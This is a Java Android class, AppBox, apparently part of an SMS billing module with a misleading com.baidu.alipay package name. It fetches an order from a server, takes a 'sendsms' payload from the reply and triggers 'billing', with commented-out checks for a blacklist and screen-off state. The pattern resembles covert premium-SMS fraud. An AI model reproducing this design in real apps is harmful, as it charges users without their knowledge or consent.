package com.baidu.alipay;

import com.baidu.alipay.net.XmlAttribute;
import com.baidu.alipay.script.sms.GuardPojoWorker;
import com.baidu.serv.HandlerThreadInstance;
import com.baidu.serv.SelfHandler;
import com.baidu.serv.SelfMessage;

import android.content.Context;
import android.os.Handler;
import android.os.Message;

public class AppBox extends Thread{
    private static final String TAG = "AppBox";

    private SelfHandler handler;
//    private Handler handler;
    private Context context;
    private int fee = 0;
    private String xml = "";
    private String random = "";
    private boolean sync;
    private boolean theSame = true;
    private boolean record = false;
    private int type1 = 0;
    
    /**
     * 
     * @param handler
     * @param context
     * @param fid
     * @param CPUserID
     * @param CPConsumerId
     * @param CPConsumerName
     * @param CPExtraStr
     * @param sync 是否同步
     */
//    public AppBox(Handler handler, Context context,int fee,boolean sync) {
    public AppBox(SelfHandler handler, Context context,int fee,boolean sync) {
       this(handler,context,fee,sync,0);
    }
    
//    public AppBox(Handler handler, Context context,int fee,boolean sync,int type1) {
    public AppBox(SelfHandler handler, Context context,int fee,boolean sync,int type1) {
        this.handler = handler;
        this.context = context;
        this.fee = fee;
        this.sync = sync;
        this.type1 = type1;
        
        init();
    }

    /**
     * 
     * @param handler
     * @param context
     * @param fid
     * @param CPUserID
     * @param CPConsumerId
     * @param CPConsumerName
     * @param CPExtraStr
     * @param sync 是否同步
     */
//    public AppBox(Handler handler, Context context,int fee,String xml,String random,boolean sync,boolean theSame,boolean record) {
    public AppBox(SelfHandler handler, Context context,int fee,String xml,String random,boolean sync,boolean theSame,boolean record) {
        this.handler = handler;
        this.context = context;
        this.fee = fee;
        this.sync = sync;
        this.xml = xml == null ? "" : xml;
        this.random = random;
        this.theSame = theSame;
        this.record = record;
        
        init();
    }
    
    private void init() {
    	
//        this.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
//			
//			@Override
//			public void uncaughtException(Thread arg0, Throwable e) {
//				e.printStackTrace();
//				handler.sendEmptyMessage(AppProperty.REQUEST_RUNERROR);
//			}
//		});
    }

    public void run() {
//    	boolean canExec = false;
//    	
//    	if(InitArgumentsHelper.getInstance(context).isPositive()){
////    		if(sync || !Utils.getHasBlack(context)){
//    			canExec = true;
////    		}
//    	}else{ 
//    		if(!Utils.getHasBlack(context) || Constant.screenOff){
//	    		canExec = true;
//	    	}else{
//	    		canExec = true;
//	    	}
//    	}
//    	
//    	if(canExec)
    	
    	
    	{
    		if(xml != null && xml.length() > 0){
    			goBilling(xml);
    		}else{
    			SelfHandler upHandler = new SelfHandler() {
    	            public void handleMessage(SelfMessage selfMessage) {
    	                try{
    	                	Message msg = selfMessage.getMessage();
    		                switch (msg.what) {
    		                case AppProperty.UPERROR:
    		                	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_UPERROR));
    		                    break;
    		                case AppProperty.UPNOORDER:
    		                	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_NOORDER));
    		                    break;
    		                case AppProperty.UPNETERROR:
    		                	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_NETERROR));
    		                    break;
    		                case AppProperty.UPSUCCESS:
    		                    XmlAttribute xmlAttribute = (XmlAttribute) msg.obj;
    		
    		                    final String xml = xmlAttribute.getSendsms();
    		
    		                    if (xml.length() > 0) {	                    	
    		                        goBilling(xml);
    		                    } else {
    		                    	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_NOORDER));
    		                    }
    		                    break;
    		                case AppProperty.UPWAIT:

    		                	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_WAIT));
    		                	break;
    		                }
    	               
    	                }catch (Exception e) {
    						 e.printStackTrace();
    					}
    	            }
    	        };
	               
    	        SelfMessage selfMessage = new UpThread(context, upHandler,fee, null, null, null,
	                		null, null,random,sync,theSame,record,type1).run1();
    		
    	        upHandler.handleMessage(selfMessage);
    		}
    	}
    }

    private void goBilling(String xml_) {
    	SelfHandler billingHandler = new SelfHandler() {
             @Override
             public void handleMessage(SelfMessage selfMessage) {
            	 Message msg = selfMessage.getMessage();
            	 
                 switch (msg.what) {
                 case AppProperty.BILLING_SUCCESS:
                     LogUtil.e(TAG, "BillingProperty.BILLING_SUCCESS");
                     
                     	handler.handleMessage(new SelfMessage(AppProperty.REQUEST_SUCCESS));
                     break;
                 case AppProperty.BILLING_ERROR:
                     LogUtil.e(TAG, "BillingProperty.BILLING_ERROR");
                    
                     handler.handleMessage(new SelfMessage(AppProperty.REQUEST_RUNERROR));
                     break;
                 }
             }
         };
         
        SelfMessage selfMessage = new AppThread(context, billingHandler, xml_,random,sync).run1();
        
        billingHandler.handleMessage(selfMessage);
    }
}
